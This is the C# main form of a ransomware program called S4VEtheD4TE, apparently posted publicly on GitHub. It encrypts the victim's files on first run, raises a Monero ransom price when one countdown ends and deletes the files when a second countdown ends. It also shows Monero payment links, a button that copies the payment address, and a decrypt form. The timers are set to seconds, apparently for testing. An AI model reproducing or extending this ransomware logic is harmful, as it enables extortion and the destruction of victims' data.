using System;
using System.Windows.Forms;
using System.Diagnostics;

namespace S4VEtheD4TE
{
    public partial class Main : Form
    {
        TimeSpan duration1;
        TimeSpan duration2;
        TimeSpan oneSecond = new TimeSpan(0, 0, 1);
        TimeSpan TimeSinceLastRun;

        public Main()
        {
            InitializeComponent();
            ShowInTaskbar = true;

            timer1.Enabled = true;

            // Resets settings on debug mode
            if (Debugger.IsAttached)
            {
                Properties.Settings.Default.Reset();
                Properties.Settings.Default.Save();
            }

            // Check for first use
            if (Properties.Settings.Default.FirstUse == true)
            {
                Utils.EncryptFiles();

                // set properties
                //duration1 = new TimeSpan(3, 0, 0, 0);
                //duration2 = new TimeSpan(7, 0, 0, 0);
                duration1 = new TimeSpan(0, 0, 0, 10);
                duration2 = new TimeSpan(0, 0, 0, 20);

                Properties.Settings.Default.Reset();
                Properties.Settings.Default.FirstUse = false;
                Properties.Settings.Default.TimePriceRaise = duration1;
                Properties.Settings.Default.TimeDeleteFiles = duration2;
                Properties.Settings.Default.DateLastRun = DateTime.Now;
                Properties.Settings.Default.Save();
            }
            else
            {
                // update time passed since last run
                TimeSinceLastRun = new TimeSpan(DateTime.Now.Day - Properties.Settings.Default.DateLastRun.Day, DateTime.Now.Hour - Properties.Settings.Default.DateLastRun.Hour, DateTime.Now.Minute - Properties.Settings.Default.DateLastRun.Minute, DateTime.Now.Second - Properties.Settings.Default.DateLastRun.Second);

                // Only update properties if timer has not reached zero
                if (Properties.Settings.Default.TimePriceRaise != new TimeSpan(0, 0, 0, 0))
                {
                    Properties.Settings.Default.TimePriceRaise = Properties.Settings.Default.TimePriceRaise.Subtract(TimeSinceLastRun);
                }
                if (Properties.Settings.Default.TimeDeleteFiles != new TimeSpan(0, 0, 0, 0))
                {
                    Properties.Settings.Default.TimeDeleteFiles = Properties.Settings.Default.TimeDeleteFiles.Subtract(TimeSinceLastRun);
                }
                Properties.Settings.Default.Save();

                // sets durations
                duration1 = Properties.Settings.Default.TimePriceRaise;
                duration2 = Properties.Settings.Default.TimeDeleteFiles;
            }

            // Check if timer is enabled
            if (!Properties.Settings.Default.TimerEnabled)
            {
                timer1.Enabled = false;
            }
        }


        private void time1_Tick(object sender, EventArgs e)
        {
            // Check if timer has reached zero
            if (duration1 != new TimeSpan(0, 0, 0, 0))
            {
                duration1 = duration1.Subtract(oneSecond);
            }
            else
            {
                Utils.RaisePrice(labelSendMonero);
            }

            if (duration2 != new TimeSpan(0, 0, 0, 0))
            {
                duration2 = duration2.Subtract(oneSecond);
            }
            else
            {
                Utils.DeleteFiles();
            }

            Properties.Settings.Default.TimePriceRaise = duration1;
            Properties.Settings.Default.TimeDeleteFiles = duration2;
            Properties.Settings.Default.DateLastRun = DateTime.Now;
            Properties.Settings.Default.Save();

            Label1.Text = duration1.ToString();
            Label2.Text = duration2.ToString();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Utils.OpenDefaultBrowser("https://www.getmonero.org/get-started/what-is-monero/");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Utils.OpenDefaultBrowser("https://www.getmonero.org/get-started/faq/");
        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Utils.OpenDefaultBrowser("https://github.com/araujo88/S4VEtheD4TE");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(textBoxAddress.Text);
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.TimePriceRaise = duration1;
            Properties.Settings.Default.TimeDeleteFiles = duration2;
            Properties.Settings.Default.DateLastRun = DateTime.Now;
            Properties.Settings.Default.Save();

            //e.Cancel = true;
        }

        private void buttonDecrypt_Click(object sender, EventArgs e)
        {
            DecryptForm.GetForm.Show();
        }

        private void buttonCheckPayment_Click(object sender, EventArgs e)
        {
            timer1.Enabled = false;
            Properties.Settings.Default.TimerEnabled = false;
        }
    }
}
